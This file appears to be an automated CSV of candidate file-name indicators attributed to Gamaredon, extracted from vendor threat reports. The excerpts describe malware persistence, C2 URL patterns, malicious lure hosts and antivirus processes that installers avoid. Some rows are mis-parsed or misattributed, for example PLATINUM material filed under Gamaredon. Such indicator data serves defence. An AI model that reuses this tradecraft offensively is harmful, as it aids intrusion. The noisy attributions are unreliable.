schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--gamaredon,artifact--sha256:9725dc59d7181533df7e28632f151c30239d7f12126fb39f867755d6699f86e4,observation--sha256:f852b07755d975ad9ae927d97c7f9861ef8249b5d921a2d9f95dfed07fdf8e6c,file-name,7za.exe,7za.exe,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"17 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 12. PteroCache (prettified) Capabilities Once a minute, PteroCache downloads and executes a PowerShell payload, which can be any of the Gamaredon tools. Some instances we observed were able to deploy an unlimited number of payloads, while some could deploy only up to 10 payloads. Network protocol For communication with its C&C server, PteroCache uses an HTTP GET request with the HTTP header x - cache, in whic",
1.0.0,actor--gamaredon,artifact--sha256:9725dc59d7181533df7e28632f151c30239d7f12126fb39f867755d6699f86e4,observation--sha256:616a8957538fcae6d0719c8c963fd8de3f23d6fcf0ff2af47308e6b668af8d2d,file-name,7za.exe,7za.exe,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"40 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX A: HOST-BASED ARTIFACTS ASSOCIATED WITH PTEROPASTE Name Value Installation paths HKCU\EUDC\first HKCU\EUDC\knok HKCU\EUDC\runner HKCU\EUDC\usb Configuration paths HKCU\EUDC\privateKeyXml Filenames .lnk %PROCESSOR_REVISION% %PROCESSOR_REVISION%.ps1 volumeinfo.ps1 test.ps1 Mutexes Local \[0-9]{4}(0[1 -9]|1[1 -2]) Scheduled task names %PROCESSOR_IDENTIFIER% Scheduled task descriptions %PROCESSOR_IDENTIFIER% AP",
1.0.0,actor--gamaredon,artifact--sha256:51025a8b06109ef909085412843d23b72528fc2c10563cb7e690557046b71fda,observation--sha256:f5d210f19dd1b7772d58aa5d8315271712d917d2a150620dba0afa0e29f6e858,file-name,Bogor.doc,Bogor.doc,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Lure documents are typically given topical names that may be of interest to the recipient. Such lures often address controversial subjects or offer provocative opinions, in an effort to incite the reader into opening them. Figure 3 shows a sample of such titles. Figure 3. Example document titles used by PLATINUM to deliver exploits SHA1 Filename e9f900b5d01320ccd4990fd322a459d709d43e4b Gambar gambar Rumah Gay Didiet Prabowo di Sentul Bogor.doc 9a4e82ba371cd2fedea0b889c879daee7a01e1b1 The real re",
1.0.0,actor--gamaredon,artifact--sha256:1d22a4e1473dbd090b795b5085c4651a099af9626bb87e6f3e0a9c90288874ab,observation--sha256:49c50493e73681bc1606215f4b650a1d6a92c9a333d81c364f8ed8b2494f7521,file-name,ChkFlsh.exe,ChkFlsh.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 4. UltraVNC The group was also looking for software with the ability to identify and retrieve data from removable data storages , as well as isolated (not connected to the Internet) information systems. From 2014 to 2016 it is known about the usage of the file ChkFlsh.exe (mikelab.kiev.ua). At the same time , the main tool of the hacker group Armageddon from 2016 has been malicious software Pterodo, which actually allowed to solve key issues of deployment in the targeted system, securing ",
1.0.0,actor--gamaredon,artifact--sha256:dedbabe129f6e4f49a2e2cf6dee1da165d18dcefe6db43af182703861aa109be,observation--sha256:ec431429c44c63c872d253a07f877c406d3ba9e6a08d02c884f49b1f8f97af9c,file-name,Defrag.exe,Defrag.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"32 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroClone Discovered by ESET Research in July 2023, PteroClone (SHA-1: 5720FFDF9D9CD649445CBC12844E2B587622643A ) is a unique PowerShell tool that uses a legitimate command line program – rclone – for managing files on cloud storage to download the next stage . It first downloads the rclone binary and c onfiguration file to %APPDATA%\Defrag , naming them Defrag.exe and rclone.conf , respectively. It",
1.0.0,actor--gamaredon,artifact--sha256:24c1d845c587cfc9b6a3c6af2cd5887f13bb218eb07293a46e752990bc786fb4,observation--sha256:14a9296ade2dbb67f8a0d1b0d58836b253a829207febda6dcdd5bf0d34a0564b,file-name,Devices.doc,Devices.doc,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Figure 6. Malicious Word 2003 files used by PLATINUM to deliver CVE-2013-7331 Filename SHA1 URL for PNG Exploit Gerakan Anti SBY II.doc 1bdc1a0bc995c1beb363b11b71c14324be8577c9 mister.nofrillspace.com/users/web8_dice/4226/space.gif Tu_Vi_Nam_Tan_ Mao_2011.doc 2a33542038a85db4911d7b846573f6b251e16b2d intent.nofrillspace.com/users/web11_focus/3807/space.gif Wikileaks Indonesia.doc d6a795e839f51c1a5aeabf5c10664936ebbef8ea mister.nofrillspace.com/users/web8_dice/3791/space.gif Top 11 Aerial Surveill,
1.0.0,actor--gamaredon,artifact--sha256:04884a854d42b76359b181b5b5cc6868cae27debd43a985c80ca00f128a0e108,observation--sha256:ed8d14ac9515b6b663b6f3afba3cd733f4201701823bb6560a111099dbbb3ac6,file-name,II.doc,II.doc,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Figure 6. Malicious Word 2003 files used by PLATINUM to deliver CVE-2013-7331 Filename SHA1 URL for PNG Exploit Gerakan Anti SBY II.doc 1bdc1a0bc995c1beb363b11b71c14324be8577c9 mister.nofrillspace.com/users/web8_dice/4226/space.gif Tu_Vi_Nam_Tan_ Mao_2011.doc 2a33542038a85db4911d7b846573f6b251e16b2d intent.nofrillspace.com/users/web11_focus/3807/space.gif Wikileaks Indonesia.doc d6a795e839f51c1a5aeabf5c10664936ebbef8ea mister.nofrillspace.com/users/web8_dice/3791/space.gif Top 11 Aerial Surveill,
1.0.0,actor--gamaredon,artifact--sha256:5dfe7cc76dc8c6d9fbad38da25cc30f3b444f71f2ee2c62df1d76cc488a35301,observation--sha256:a1f7a58eefb1a05a375739835e9c062abf93b20d1e01be6ce267ea2c13c8970d,file-name,Indonesia.doc,Indonesia.doc,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Figure 6. Malicious Word 2003 files used by PLATINUM to deliver CVE-2013-7331 Filename SHA1 URL for PNG Exploit Gerakan Anti SBY II.doc 1bdc1a0bc995c1beb363b11b71c14324be8577c9 mister.nofrillspace.com/users/web8_dice/4226/space.gif Tu_Vi_Nam_Tan_ Mao_2011.doc 2a33542038a85db4911d7b846573f6b251e16b2d intent.nofrillspace.com/users/web11_focus/3807/space.gif Wikileaks Indonesia.doc d6a795e839f51c1a5aeabf5c10664936ebbef8ea mister.nofrillspace.com/users/web8_dice/3791/space.gif Top 11 Aerial Surveill,
1.0.0,actor--gamaredon,artifact--sha256:56be5dfa96c2cbd24949aef899f376815eb27047da154987027e721f5a688a04,observation--sha256:7fb4f4484247277aef8036b75de93536d3635c280a50e4c63922df9b28d90037,file-name,LocalSMS.dll,LocalSMS.dll,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The virus provides the following actions: the virus copies its files to the operating system startup folders %APPDATA%\Microsoft\Windows\Start and Menu\Programs\Startup, and registers itself in the task scheduler (Figure 6) in order to wait for action from the command & control server (C2). In earlier versions, command & control servers were hard - coded, but from 2019 the SSU noticed additional configuration files with backup С2 list. Figure 6. An example which demonstrate unauthorized schedule",
1.0.0,actor--gamaredon,artifact--sha256:30880b30c8882d661ef86e4dc357f701a0776bef3dec8cc12e99f8416126ef93,observation--sha256:c88fcb5f9bcfb8863986f0f03600158806f84818e12e1cabb586839f83178e77,file-name,Mao_2011.doc,Mao_2011.doc,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Figure 6. Malicious Word 2003 files used by PLATINUM to deliver CVE-2013-7331 Filename SHA1 URL for PNG Exploit Gerakan Anti SBY II.doc 1bdc1a0bc995c1beb363b11b71c14324be8577c9 mister.nofrillspace.com/users/web8_dice/4226/space.gif Tu_Vi_Nam_Tan_ Mao_2011.doc 2a33542038a85db4911d7b846573f6b251e16b2d intent.nofrillspace.com/users/web11_focus/3807/space.gif Wikileaks Indonesia.doc d6a795e839f51c1a5aeabf5c10664936ebbef8ea mister.nofrillspace.com/users/web8_dice/3791/space.gif Top 11 Aerial Surveill,
1.0.0,actor--gamaredon,artifact--sha256:bc73263de9e3800e3147837e0f96cc8aa5c21e4b0d17ea564790ee90b84b7f7a,observation--sha256:01ecd72355513675d9b29a8ae24e9ad6e31cfa65bdb30b45b2d606c5911784ec,file-name,MpOav.dll,MpOav.dll,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"31 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 ° OS version, ° original install date, ° system boot time, ° system type, ° system directory, ° logon server, ° domain, ° total physical memory, and ° available physical memory. · used and free space of all connected drives, · a list of running processes, · a list of installed applications enumerated from two registry keys: ° HKLM\Software\Microsoft \Windows\CurrentVersion \Uninstall\ , and ° HKCU\So",
1.0.0,actor--gamaredon,artifact--sha256:7f0ab6ccc3fa4a1439953c11750e8bf5abfabbc9b7df71ea986d0fc400db3577,observation--sha256:e6aafa90a552132ebcc6bb8ece9ce41761f9fafe7362a497f5dbdbe6e605c407,file-name,NTUSER.DAT,NTUSER.DAT,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"41 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %TEMP% \1.exe APPENDIX C: HOST-BASED ARTIFACTS ASSOCIATED WITH THE SECOND VARIANT OF THE PTEROLNK VBSCRIPT VERSION Name Value Installation paths %PUBLIC% \NTUSER.DAT.TMContainer00000000000000000001.regtrans -ms %PUBLIC% \NTUSER.DAT.TMContainer00000000000000000002.regtrans -ms %PUBLIC% \ntuser.ini:SRV %PUBLIC% \ntuser.ini:LNK %USERPROFILE% \boot.ini:SRV %USERPROFILE% \boot.ini:LNK %USERPROFILE% \boot.ini:G",
1.0.0,actor--gamaredon,artifact--sha256:dc5ee8fc4ec50888a577e01ed2bb92bf4bd1145aec50dc121c28d282b1165ebd,observation--sha256:ee0c4f0af727c2d86df2d93a4160d713f6cddec6d19e6f93fe5404797bdc8c15,file-name,Office.docx,Office.docx,candidate,,unknown,unknown,not-stated,,source--gamaredon--56ce9c37d34fb725,Gamaredon/BlueAlpha Abuses Cloudflare Tunneling Service for GammaDrop Staging Infrastructure.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS Figure9DeobfuscatedGammaDroppayload93aa6cd0787193b4ba5ba6367122dee846c5d18ad77919b261c15ff583b0ca17Source:RecordedFuture) GammaDropwill writeGammaLoadtodiskinthedirectory%USERPROFILE%andexecuteit usingawscript.execommand. GammaDropwill set persistencefor GammaLoadusingarunkeyonlyif theprocessQHActiveDefense.exeisnot running, aprocessnamelikelyassociatedwiththe360TotalSecurityendpointagent.GammaDropalsowritesanIPaddresstoa.DICfilein%APPDATA%thatGammaLoadleveragesfor C2initsi",
1.0.0,actor--gamaredon,artifact--sha256:500e35f95ffa9b4f3220aa8c6aff5fd117791cff57537082fd0c78baea4dbcf1,observation--sha256:2842c57d5a32a8808bf90f3380970df57fcb8d8608532a15efb1a284213f1f84,file-name,Pk2.exe,Pk2.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"A second Dipsind variant registers as a Winlogon Event Notify DLL. This backdoor contains a minimized feature list from the original Dipsind variant, and supports a more limited number of commands. It sets the following registry keys in the HKEY_LOCAL_MACHINE hive for persistence and functionality: • SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\Cscdll32\Asynchronous • SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\Cscdll32\DllName • SOFTWARE\Microsoft\Windows NT\Cur",
1.0.0,actor--gamaredon,artifact--sha256:ed20c670d5e7dbac18886b10448d3062c2fa8c265922b3f61dcfe1cb9384795f,observation--sha256:c3425402caa7a838c88fe06fa2e464046fabe52893cd3f85086450dcb4d7cc5e,file-name,President.doc,President.doc,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Lure documents are typically given topical names that may be of interest to the recipient. Such lures often address controversial subjects or offer provocative opinions, in an effort to incite the reader into opening them. Figure 3 shows a sample of such titles. Figure 3. Example document titles used by PLATINUM to deliver exploits SHA1 Filename e9f900b5d01320ccd4990fd322a459d709d43e4b Gambar gambar Rumah Gay Didiet Prabowo di Sentul Bogor.doc 9a4e82ba371cd2fedea0b889c879daee7a01e1b1 The real re",
1.0.0,actor--gamaredon,artifact--sha256:c5be75ae1907e00d8814ed4d06cd4aa87dcecfdc8dc97e0975aaa577b326c2a0,observation--sha256:4089592e9d78cb91406c2f6c84247f8c5f9568ce3533b06fec6c5acdca7cb322,file-name,Resume.docx,Resume.docx,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Figure 6. Malicious Word 2003 files used by PLATINUM to deliver CVE-2013-7331 Filename SHA1 URL for PNG Exploit Gerakan Anti SBY II.doc 1bdc1a0bc995c1beb363b11b71c14324be8577c9 mister.nofrillspace.com/users/web8_dice/4226/space.gif Tu_Vi_Nam_Tan_ Mao_2011.doc 2a33542038a85db4911d7b846573f6b251e16b2d intent.nofrillspace.com/users/web11_focus/3807/space.gif Wikileaks Indonesia.doc d6a795e839f51c1a5aeabf5c10664936ebbef8ea mister.nofrillspace.com/users/web8_dice/3791/space.gif Top 11 Aerial Surveill,
1.0.0,actor--gamaredon,artifact--sha256:a95159e0ace73b8a1d7f73cccc32933571ec60e6ad1b910a03c65a1dec518d43,observation--sha256:c7b7846873dbce60a00593238469daa6fc32b57d8f4ca283f1508a9f1e971802,file-name,Reverse.pdb,Reverse.pdb,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"32 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroClone Discovered by ESET Research in July 2023, PteroClone (SHA-1: 5720FFDF9D9CD649445CBC12844E2B587622643A ) is a unique PowerShell tool that uses a legitimate command line program – rclone – for managing files on cloud storage to download the next stage . It first downloads the rclone binary and c onfiguration file to %APPDATA%\Defrag , naming them Defrag.exe and rclone.conf , respectively. It",
1.0.0,actor--gamaredon,artifact--sha256:b5d1837fbedb015db228c6d680d39d368f91fce9d08cf85c5df9f8d210534f29,observation--sha256:d9d70f12d3b85d560016b87c80fc24515d5c66e7f4962fdb6a5e7062a9f6252d,file-name,SEMBOYAN_1.doc,SEMBOYAN_1.doc,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Figure 6. Malicious Word 2003 files used by PLATINUM to deliver CVE-2013-7331 Filename SHA1 URL for PNG Exploit Gerakan Anti SBY II.doc 1bdc1a0bc995c1beb363b11b71c14324be8577c9 mister.nofrillspace.com/users/web8_dice/4226/space.gif Tu_Vi_Nam_Tan_ Mao_2011.doc 2a33542038a85db4911d7b846573f6b251e16b2d intent.nofrillspace.com/users/web11_focus/3807/space.gif Wikileaks Indonesia.doc d6a795e839f51c1a5aeabf5c10664936ebbef8ea mister.nofrillspace.com/users/web8_dice/3791/space.gif Top 11 Aerial Surveill,
1.0.0,actor--gamaredon,artifact--sha256:0006ff1812542b502fd695fa325f63d5aa2688bdd8188e435388bbeecbdfc8c8,observation--sha256:d1c9a575db6de1f229c989e5295fd6a7547e64e9f53840b56046bbdca85808b7,file-name,Thearchivefiledownloadedinthisexampleisa7zipfilenamed56-27-11875.rar,Thearchivefiledownloadedinthisexampleisa7zipfilenamed56-27-11875.rar,candidate,,unknown,unknown,not-stated,,source--gamaredon--56ce9c37d34fb725,Gamaredon/BlueAlpha Abuses Cloudflare Tunneling Service for GammaDrop Staging Infrastructure.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS Thearchivefiledownloadedinthisexampleisa7zipfilenamed56-27-11875.rar (a7zipfilewitha.rarextension). Oncedecompressed, asingledirectorynamed56-27-11875isextractedcontaininga.lnkfilenamedЗапит 56-27-11875 від 15.08.2024. Інформація з обмеженим доступому службовому листі відсутня. lnk, asshowninFigure7. ThefilenameroughlytranslatestoRequest 56-27-11875 dated August 15, 2024. There is no restricted accessinformation in the service letter.lnk. Figure7 Contentsofsmuggled7ziparchiv",
1.0.0,actor--gamaredon,artifact--sha256:0ad09e7868e35580bf79a30a8d7b01cd9376c97f12b66672f990006986363b6e,observation--sha256:fd6d2f62b32ae68d733c2f9c8cf661d8af587f35200582b3313b287e4fc3db93,file-name,WINWORD.EXE,WINWORD.EXE,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"23 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 First, PteroDoc enables programmatic access to VBA projects and enables all Word macros by setting the following registry values to 1: · HKCU\Software\Microsoft \Office\<WordVersion> \Word\Security\ AccessVBOM · HKCU\Software\Microsoft \Office\<WordVersion> \Word\Security\ VBAWarnings The <WordVersion> is variable and dynamically resolved from the Word.Application VBScript object by PteroDoc during i",
1.0.0,actor--gamaredon,artifact--sha256:8e0cdacd4fb9d22a19e0566e44b63f77c9a35ce9c9e2cac24822e4eac9fc7f17,observation--sha256:5745bedc931c5cc0eaf02083f05c2b87747a725ad6e878320dd59b2213c0dc0f,file-name,account.php,account.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 URL leading to a PE file PowerShell command Encrypted VBScript PteroPSLoad time.php 13BA279D8602FEE7CEDE152B6A9148CD9D2F6662 ✓ ✓ PteroPSLoad slot.php B99D4724077B0A2CBEEE38332C05F3D4171C9DCC ✓ ✓ ✓ PteroPSLoad index.php 025E3D88C53FC12D5A4AAB726E696F2815BAC84D ✓ ✓ ✓ PteroPSLoad new.php D5576E578518E474A5DFF654C44AB3EC4A6E4ECF ✓ ✓ ✓ PteroPSLoad post.php E0BD8855159CB708789C4DE183E107C5C117FBA1 ✓ ✓ ✓ Pt,
1.0.0,actor--gamaredon,artifact--sha256:8e0cdacd4fb9d22a19e0566e44b63f77c9a35ce9c9e2cac24822e4eac9fc7f17,observation--sha256:ffe692228bc58c9f5006601b651f5e19014191f302ba8c41ec08bc97939d927a,file-name,account.php,account.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 This whole functionality was later removed from PteroPSLoad. account.php This version, in comparison to the previous one, contains two notable changes. The first in the persistence mechanism used, and the second in the way that it communicates with its C&C server. Persistence is ensured by dropping a small PowerShell loader with a randomly generated filename to %ALLUSERSPROFILE% and scheduling it to ",
1.0.0,actor--gamaredon,artifact--sha256:aec24e65eb459048fe82efcea48ba080b6c7e490964d7caad2ed20dd025d75aa,observation--sha256:2fe276e9fa04d86a20f7b65a4d737a532e4be175e0249aa8a17894b151d7cec0,file-name,api.php,api.php,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"20 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Third variant As described in our Gamaredon 2024 whitepaper, the third variant uses a downloader component , which we’ve now named PteroQuark. On February 10th, 2025, PteroQuark was updated with these key changes: • The tokens that it expects in downloaded base64 -encoded payloads changed from ?? to ))). • PteroQuark’s C&C config is stored in alternate data streams instead of in registry values. It uses randomly nam",
1.0.0,actor--gamaredon,artifact--sha256:0a7a46178e7a57df589bccbba8bd09ce78a7026d8b358becce8eccf957844d58,observation--sha256:ceeaa803337b89e88876efea1ef57fc2b1ef5365f5f704093d63cd5dc39f0898,file-name,archive.7z,archive.7z,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"40 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX A: HOST-BASED ARTIFACTS ASSOCIATED WITH PTEROPASTE Name Value Installation paths HKCU\EUDC\first HKCU\EUDC\knok HKCU\EUDC\runner HKCU\EUDC\usb Configuration paths HKCU\EUDC\privateKeyXml Filenames .lnk %PROCESSOR_REVISION% %PROCESSOR_REVISION%.ps1 volumeinfo.ps1 test.ps1 Mutexes Local \[0-9]{4}(0[1 -9]|1[1 -2]) Scheduled task names %PROCESSOR_IDENTIFIER% Scheduled task descriptions %PROCESSOR_IDENTIFIER% AP",
1.0.0,actor--gamaredon,artifact--sha256:16897eef6ccfd0fc9ec52e5025bcf337f841a3d0d9551d9d926d840b86f01c23,observation--sha256:7bcac95e255ae996eb60b99b3ce5c142a655a23df0acae344d7cccc267ca21d7,file-name,auth.php,auth.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,17 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Table 3. URL patterns as sociated with dedicated downloaders Associated URL patterns Downloader of PteroPShell http://<IP>/cmd http://<IP>/scripts/cmd.txt http://<IP>/test/cmd.txt Downloader of PteroBleed http://<IP>/scripts/web.txt http://<IP>/test/web.txt Downloader of PteroClone http://<IP>/test/copy.txt Downloader of PteroCookie http://<IP>/cookies http://<IP>/scripts/cookies.txt http://<IP>/admi,
1.0.0,actor--gamaredon,artifact--sha256:5fe1c22844c7f86983c3f2eab7ab26b4fb36178b7a8fb2e37365719984a83c77,observation--sha256:6e7e2f0675fd2b4af457b5a0cff4a1510cb932eaace952dba371121dd96c5330,file-name,avp.exe,avp.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 15. Security-related processes avoided by the JPIN installer Process Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Process Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmccore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After installing the backdoor, the installer deletes itself from the compromised computer. PLATINUM uses at l",
1.0.0,actor--gamaredon,artifact--sha256:c6881d1f8e8ef166db2588fb979be76e62e53fc9034fe4774d603e069da32240,observation--sha256:10b977d4196f38bc013cd62ef23dde0ede90d78dadb2429d1b7a14f98b7fe3f1,file-name,bdagent.exe,bdagent.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 15. Security-related processes avoided by the JPIN installer Process Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Process Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmccore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After installing the backdoor, the installer deletes itself from the compromised computer. PLATINUM uses at l",
